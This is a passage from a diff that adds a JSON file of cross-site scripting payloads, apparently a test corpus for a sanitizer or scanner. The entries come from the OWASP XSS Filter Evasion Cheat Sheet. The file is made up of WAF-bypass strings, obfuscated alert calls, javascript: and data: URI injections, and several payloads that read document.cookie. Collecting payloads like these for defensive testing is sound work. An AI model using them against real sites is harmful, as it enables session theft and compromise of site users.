+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / General issues / DOM-based XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-genera-eee1e42c3a",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / General issues / DOM-based XSS",
+    "payload_html": "/?xss=document.cookie",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / General issues / DOM-based XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-genera-6bdc81899c",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / General issues / XSS via request Redirection",
+    "payload_html": "...\nheader('Location: '.$_GET['param']);\n...",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / General issues / XSS via request Redirection"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-genera-ed5ef97a3e",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / General issues / XSS via request Redirection",
+    "payload_html": "...\nheader('Refresh: 0; URL='.$_GET['param']);\n...",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / General issues / XSS via request Redirection"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-genera-27fce705d6",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / General issues / XSS via request Redirection",
+    "payload_html": "/?param=<javascript:alert(document.cookie>)",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / General issues / XSS via request Redirection"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-genera-c703697456",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / General issues / XSS via request Redirection",
+    "payload_html": "/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / General issues / XSS via request Redirection"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-795d398d82",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<Img src = x onerror = \"javascript: window.onerror = alert; throw XSS\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-e5cee64be2",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<Video> <source onerror = \"javascript: alert (XSS)\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-fb2485eba8",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<Input value = \"XSS\" type = text>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-3c03109afa",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<applet code=\"javascript:confirm(document.cookie);\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-f21392130d",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<isindex x=\"javascript:\" onmouseover=\"alert(XSS)\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-1578fd5550",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "\"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-ff4cb7f695",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "\"><img src=\"x:x\" onerror=\"alert(XSS)\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-2a98bd57b7",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "\"><iframe src=\"javascript:alert(XSS)\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-56f8eeeafb",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<object data=\"javascript:alert(XSS)\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-33fd9a87a1",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<isindex type=image src=1 onerror=alert(XSS)>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-6dd6be4d7c",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<img src=x:alert(alt) onerror=eval(src) alt=0>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-26ed772d67",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<img  src=\"x:gif\" onerror=\"window['al\\u0065rt'](0)\"></img>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-f38ac06c74",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<iframe/src=\"data:text/html,<svg onload=alert(1)>\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-4cf563e661",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>",
+    "payload_context": "html_head",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-05067d7341",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-e7a5f9ec8b",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\">",
+    "payload_context": "html_head",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-482536b535",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-094f53cfd1",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<form><a href=\"javascript:\\u0061lert(1)\">X",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-dd523431f0",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "</script><img/*%00/src=\"worksinchrome&colon;prompt(1)\"/%00*/onerror='eval(src)'>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-df6515623c",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<style>//*{x:expression(alert(/xss/))}//<style></style>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-a81072055f",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<img src=\"/\" =_=\" title=\"onerror='prompt(1)'\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-e4efcfc631",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-f0a7ac0e7a",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<script x> alert(1) </script 1=2",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-7ced6b7e2a",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<form><button formaction=javascript&colon;alert(1)>CLICKME",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-f499f9cf95",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-64df7b6e4e",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-waf-by-2dec9af604",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS",
+    "payload_html": "<OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"></OBJECT>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / WAF ByPass Strings for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-filter-6de9bc3189",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation",
+    "payload_html": "(alert)(1)",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-filter-e2f822ca2c",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation",
+    "payload_html": "a=alert,a(1)",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-filter-093b3c8745",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation",
+    "payload_html": "[1].find(alert)",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-filter-c551323eb6",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation",
+    "payload_html": "top[“al”+”ert”](1)",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-filter-7e88ef229d",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation",
+    "payload_html": "top[/al/.source+/ert/.source](1)",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-filter-4ecaf94ee9",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation",
+    "payload_html": "al\\u0065rt(1)",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-filter-90bf7b403f",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation",
+    "payload_html": "top[‘al\\145rt’](1)",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-filter-6600eb4770",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation",
+    "payload_html": "top[‘al\\x65rt’](1)",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-filter-225ba85794",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation",
+    "payload_html": "top[8680439..toString(30)](1)",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-filter-3dec3ef68d",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation",
+    "payload_html": "alert?.()",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-filter-a9b208e3c3",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation",
+    "payload_html": "(alert())",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-filter-11b4f3d9c0",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation",
+    "payload_html": "&#96;`${alert``}`&#96;",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / Filter Bypass Alert Obfuscation"
+  }
+]
+}
